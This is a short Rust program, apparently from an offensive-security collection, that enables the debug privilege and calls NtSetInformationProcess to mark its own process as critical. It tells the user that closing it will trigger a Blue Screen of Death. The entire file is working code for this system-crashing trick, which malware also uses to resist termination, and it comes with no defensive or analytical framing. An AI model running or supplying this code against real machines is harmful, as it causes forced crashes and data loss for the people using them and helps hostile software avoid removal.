/*
    Program to invoke BSOD through NtSetInformationProcess.
    @5mukx
*/

use std::mem;
use std::ptr;
use std::ffi::CString;
use winapi::ctypes::c_void;
use winapi::um::processthreadsapi::{GetCurrentProcess, OpenProcessToken};
use winapi::um::securitybaseapi::AdjustTokenPrivileges;
use winapi::um::winnt::{
    TOKEN_ADJUST_PRIVILEGES, TOKEN_QUERY, SE_DEBUG_NAME, TOKEN_PRIVILEGES, LUID, SE_PRIVILEGE_ENABLED,
};
use winapi::um::winbase::LookupPrivilegeValueA;
use winapi::um::errhandlingapi::GetLastError;
use ntapi::ntpsapi::NtSetInformationProcess;

fn main() {
    println!("Invoke BSOD");

    unsafe {
        let mut token_handle: winapi::um::winnt::HANDLE = ptr::null_mut();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut token_handle) == 0 {
            println!("Failed to open process token. Error: {}", GetLastError());
            return;
        }

        let mut luid: LUID = LUID { LowPart: 0, HighPart: 0 };
        let debug_privilege = CString::new(SE_DEBUG_NAME).unwrap();
        if LookupPrivilegeValueA(ptr::null(), debug_privilege.as_ptr(), &mut luid) == 0 {
            println!("Failed to lookup privilege value. Error: {}", GetLastError());
            return;
        }

        let tp: TOKEN_PRIVILEGES = TOKEN_PRIVILEGES {
            PrivilegeCount: 1,
            Privileges: [winapi::um::winnt::LUID_AND_ATTRIBUTES {
                Luid: luid,
                Attributes: SE_PRIVILEGE_ENABLED,
            }],
        };

        AdjustTokenPrivileges(token_handle, 0, &tp as *const _ as *mut _, 0, ptr::null_mut(), ptr::null_mut());

        let last_error = GetLastError();
        if last_error != 0 {
            println!("Failed to adjust token privileges. Error: {}", last_error);
            return;
        }

        let current_process: *mut c_void = GetCurrentProcess();
        let is_critical = 1; 
        let break_on_termination = 0x1D; 

        let status = NtSetInformationProcess(
            current_process,
            break_on_termination as u32,
            &is_critical as *const _ as *mut _,
            mem::size_of::<i32>() as u32,
        );

        if status != 0 {
            println!("Failed to set process as critical. Status: {}", status);
        } else {
            println!("Process is now critical. Close this program to trigger a BSOD.");
        }
    }
}

